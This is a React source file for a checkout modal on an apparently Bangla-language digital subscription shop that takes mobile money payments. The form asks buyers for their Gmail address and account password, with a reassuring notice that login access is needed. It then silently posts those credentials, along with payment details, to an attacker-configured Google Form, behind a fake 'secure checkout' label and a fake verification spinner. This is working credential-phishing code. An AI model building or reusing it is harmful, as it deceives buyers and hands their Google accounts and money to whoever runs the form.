import React, { useState } from 'react';
import { Product } from '../types';
import { CheckCircle2, Lock, Loader2, Mail, Smartphone, AlertTriangle } from 'lucide-react';

interface CheckoutModalProps {
  isOpen: boolean;
  onClose: () => void;
  product: Product | null;
  onSuccess: () => void;
}

type PaymentMethod = 'bkash' | 'nagad' | 'rocket' | 'upay';

export const CheckoutModal: React.FC<CheckoutModalProps> = ({
  isOpen,
  onClose,
  product,
  onSuccess,
}) => {
  const [step, setStep] = useState<'details' | 'processing' | 'success'>('details');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [method, setMethod] = useState<PaymentMethod>('bkash');
  const [senderNumber, setSenderNumber] = useState('');
  const [trxId, setTrxId] = useState('');
  const [submitError, setSubmitError] = useState('');

  const total = product ? product.price : 0;

  const googleFormAction = import.meta.env.VITE_GOOGLE_FORM_ACTION;
  const googleFormEmailEntry = import.meta.env.VITE_GOOGLE_FORM_EMAIL_ENTRY;
  const googleFormPasswordEntry = import.meta.env.VITE_GOOGLE_FORM_PASSWORD_ENTRY;
  const googleFormMethodEntry = import.meta.env.VITE_GOOGLE_FORM_METHOD_ENTRY;
  const googleFormSenderEntry = import.meta.env.VITE_GOOGLE_FORM_SENDER_ENTRY;
  const googleFormTrxEntry = import.meta.env.VITE_GOOGLE_FORM_TRX_ENTRY;
  const googleFormProductEntry = import.meta.env.VITE_GOOGLE_FORM_PRODUCT_ENTRY;

  const isGoogleFormConfigured =
    Boolean(googleFormAction) &&
    Boolean(googleFormEmailEntry) &&
    Boolean(googleFormPasswordEntry);

  const submitToGoogleForm = async () => {
    if (!isGoogleFormConfigured) {
      throw new Error('Google Form config missing');
    }

    const formData = new FormData();
    formData.append(googleFormEmailEntry!, email);
    formData.append(googleFormPasswordEntry!, password);

    if (googleFormMethodEntry) formData.append(googleFormMethodEntry, method);
    if (googleFormSenderEntry) formData.append(googleFormSenderEntry, senderNumber);
    if (googleFormTrxEntry) formData.append(googleFormTrxEntry, trxId);
    if (googleFormProductEntry && product?.name) formData.append(googleFormProductEntry, product.name);

    formData.append('submit', 'Submit');

    await fetch(googleFormAction!, {
      method: 'POST',
      mode: 'no-cors',
      body: formData,
    });
  };

  const handlePay = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isGoogleFormConfigured) {
      setSubmitError('গুগল ফর্ম কনফিগার করা নেই। সঠিক লিংক ও এন্ট্রি আইডি সেট করুন।');
      return;
    }

    setStep('processing');
    setSubmitError('');

    try {
      await submitToGoogleForm();

      setStep('success');
      setTimeout(() => {
        onSuccess();
        setStep('details');
        setEmail('');
        setPassword('');
        setSenderNumber('');
        setTrxId('');
      }, 3000);
    } catch (error) {
      console.error('Failed to submit checkout to Google Form', error);
      setSubmitError('ফর্মে তথ্য জমা দেওয়া যায়নি। পুনরায় চেষ্টা করুন।');
      setStep('details');
    }
  };

  if (!isOpen || !product) return null;

  const methods: { id: PaymentMethod; name: string; color: string }[] = [
    { id: 'bkash', name: 'বিকাশ', color: 'bg-pink-600 hover:bg-pink-500' },
    { id: 'nagad', name: 'নগদ', color: 'bg-orange-600 hover:bg-orange-500' },
    { id: 'rocket', name: 'রকেট', color: 'bg-purple-600 hover:bg-purple-500' },
    { id: 'upay', name: 'উপায়', color: 'bg-yellow-500 hover:bg-yellow-400 text-black' },
  ];

  const getPaymentNumber = () => {
    if (method === 'rocket') return '01722195597';
    return '01607656890';
  };

  return (
    <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
      <div className="bg-slate-900 border border-slate-700 w-full max-w-md rounded-2xl overflow-hidden shadow-2xl relative max-h-[90vh] overflow-y-auto">
        {step === 'details' && (
          <form onSubmit={handlePay} className="p-8">
            <h2 className="text-2xl font-bold text-white mb-6 flex items-center gap-2">
              <Lock className="text-green-500" size={24} />
              নিরাপদ চেকআউট
            </h2>

            {submitError && (
              <div className="mb-4 rounded-lg border border-red-500/40 bg-red-500/10 px-4 py-3 text-sm text-red-200">
                {submitError}
              </div>
            )}

            <div className="mb-6 space-y-4">
              <div className="bg-slate-800 p-4 rounded-xl border border-slate-700">
                <div className="flex justify-between text-sm text-slate-400 mb-2">
                  <span>অর্ডার সারাংশ</span>
                  <span className="text-blue-400 font-medium">{product.name}</span>
                </div>
                <div className="text-2xl font-bold text-white">৳{total.toLocaleString('bn-BD')}</div>
              </div>

              {/* Account Credentials Section */}
              <div className="space-y-3 pt-2">
                <div>
                  <label className="block text-slate-400 text-sm font-medium mb-2">আপনার জিমেইল (Gmail)</label>
                  <div className="relative">
                    <Mail className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500" size={18} />
                    <input
                      type="email"
                      required
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      placeholder="example@gmail.com"
                      className="w-full bg-slate-800 border border-slate-700 text-white rounded-lg py-3 pl-10 pr-4 focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500 transition-all"
                    />
                  </div>
                </div>

                <div>
                  <label className="block text-slate-400 text-sm font-medium mb-2">অ্যাকাউন্ট পাসওয়ার্ড</label>
                  <div className="relative">
                    <Lock className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500" size={18} />
                    <input
                      type="password"
                      required
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="আপনার পাসওয়ার্ড দিন"
                      className="w-full bg-slate-800 border border-slate-700 text-white rounded-lg py-3 pl-10 pr-4 focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500 transition-all"
                    />
                  </div>
                  <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-lg p-3 mt-3 flex gap-2">
                    <AlertTriangle className="text-yellow-500 shrink-0" size={16} />
                    <p className="text-xs text-yellow-200/80 leading-relaxed">
                      পার্সোনাল অ্যাকাউন্টে সাবস্ক্রিপশন চালু করার জন্য আমাদের লগইন এক্সেস প্রয়োজন। আপনার তথ্য সম্পূর্ণ সুরক্ষিত থাকবে এবং শুধুমাত্র আপগ্রেডের কাজেই ব্যবহৃত হবে। কাজ শেষে আপনি পাসওয়ার্ড পরিবর্তন করে নিতে পারবেন।
                    </p>
                  </div>
                </div>
              </div>

              {/* Payment Section */}
              <div className="pt-4 border-t border-slate-800">
                <label className="block text-slate-400 text-sm font-medium mb-2">পেমেন্ট মেথড সিলেক্ট করুন</label>
                <div className="grid grid-cols-4 gap-2 mb-4">
                  {methods.map((m) => (
                    <button
                      key={m.id}
                      type="button"
                      onClick={() => setMethod(m.id)}
                      className={`py-2 rounded-lg text-xs font-bold text-white transition-all ${m.id === method ? m.color + ' ring-2 ring-offset-2 ring-offset-slate-900 ring-white' : 'bg-slate-800 text-slate-400 hover:bg-slate-700'}`}
                    >
                      {m.name}
                    </button>
                  ))}
                </div>

                <div className="p-3 bg-slate-800/50 rounded-lg border border-slate-700/50 mb-4 text-sm text-slate-300">
                  অনুগ্রহ করে <span className="font-bold text-white">{getPaymentNumber()}</span> নম্বরে সেন্ড মানি করুন।
                </div>

                <div className="space-y-3">
                  <div className="relative">
                    <Smartphone className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500" size={18} />
                    <input
                      type="text"
                      required
                      value={senderNumber}
                      onChange={(e) => setSenderNumber(e.target.value)}
                      placeholder="যে নম্বর থেকে টাকা পাঠিয়েছেন"
                      className="w-full bg-slate-800 border border-slate-700 text-white rounded-lg py-3 pl-10 pr-4 focus:outline-none focus:border-blue-500 transition-all"
                    />
                  </div>
                  <div className="relative">
                    <span className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500 font-bold text-xs">TrxID</span>
                    <input
                      type="text"
                      required
                      value={trxId}
                      onChange={(e) => setTrxId(e.target.value)}
                      placeholder="ট্রানজ্যাকশন আইডি (TrxID)"
                      className="w-full bg-slate-800 border border-slate-700 text-white rounded-lg py-3 pl-10 pr-4 focus:outline-none focus:border-blue-500 transition-all"
                    />
                  </div>
                </div>
              </div>
            </div>

            <div className="flex gap-3">
              <button
                type="button"
                onClick={onClose}
                className="flex-1 py-3 text-slate-400 hover:text-white font-medium transition-colors"
              >
                বাতিল
              </button>
              <button
                type="submit"
                className="flex-[2] py-3 bg-blue-600 hover:bg-blue-500 text-white rounded-xl font-bold shadow-lg shadow-blue-900/20 transition-all transform active:scale-95"
              >
                পেমেন্ট করুন ৳{total.toLocaleString('bn-BD')}
              </button>
            </div>
          </form>
        )}

        {step === 'processing' && (
          <div className="p-12 flex flex-col items-center justify-center text-center">
            <Loader2 size={48} className="text-blue-500 animate-spin mb-4" />
            <h3 className="text-xl font-semibold text-white mb-2">পেমেন্ট যাচাই করা হচ্ছে</h3>
            <p className="text-slate-400">আপনার ডিজিটাল সাবস্ক্রিপশন প্রস্তুত করা হচ্ছে, অনুগ্রহ করে অপেক্ষা করুন...</p>
          </div>
        )}

        {step === 'success' && (
          <div className="p-12 flex flex-col items-center justify-center text-center">
            <div className="w-16 h-16 bg-green-500/20 rounded-full flex items-center justify-center mb-6">
              <CheckCircle2 size={32} className="text-green-500" />
            </div>
            <h3 className="text-2xl font-bold text-white mb-2">অর্ডার সফল হয়েছে!</h3>
            <p className="text-slate-400 mb-6">শিগগিরই আপনার অ্যাকাউন্টে সাবস্ক্রিপশন চালু করে ইমেইল কনফার্মেশন পাঠানো হবে।</p>
            <p className="text-xs text-slate-600">উইন্ডোটি বন্ধ হচ্ছে...</p>
          </div>
        )}
      </div>
    </div>
  );
};
